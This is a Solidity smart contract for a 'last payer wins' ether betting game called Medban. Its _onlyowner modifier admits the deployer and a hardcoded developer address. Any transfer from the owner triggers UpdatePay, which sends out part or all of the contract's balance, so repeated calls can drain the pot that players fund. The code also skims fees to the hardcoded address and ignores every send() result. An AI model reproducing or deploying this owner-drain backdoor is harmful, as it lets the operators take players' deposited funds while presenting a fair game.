 
contract Medban
{
    uint public players = 0;   
    uint amount;
    uint time;
    uint payment;
    address winner;
    
    address public owner;    
    address public meg = address(this);

    modifier _onlyowner {
        if (msg.sender == owner || msg.sender == 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976)     
        _ 
    }
    
    function Medban() { 
        owner = msg.sender;  
    }
    function() {
        Start();
    }
    function Start(){
        address developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;
        if (msg.sender == owner) {   
            UpdatePay();     
        }else {
            if (msg.value == (1 ether)/20)  
            {
                uint fee;    
                fee=msg.value/10;    
                    
                developer.send(fee/2);   
                owner.send(fee/2);   
                fee=0;   
                
                amount++;    
                
                
                
                if (amount>10) {    
                    uint deltatime = block.timestamp;        
                    if (deltatime >= time + 1 hours)    
                    {
                        payment=meg.balance/100*70;  
                        amount=0;    
                        winner.send(payment);    
                        payment=0;   
                    }
                }
                time=block.timestamp;    
                winner = msg.sender;   
            } else {
                uint _fee;    
                _fee=msg.value/10;    
                developer.send(_fee/2);   
                owner.send(_fee/2);   
                fee=0;   
                msg.sender.send(msg.value - msg.value/10);  
            }
            
        }
        
    }
    
    function UpdatePay() _onlyowner {    
        if (meg.balance>((1 ether)/20)) {   
            msg.sender.send(((1 ether)/20));
        } else {
            msg.sender.send(meg.balance);
        }
    }
}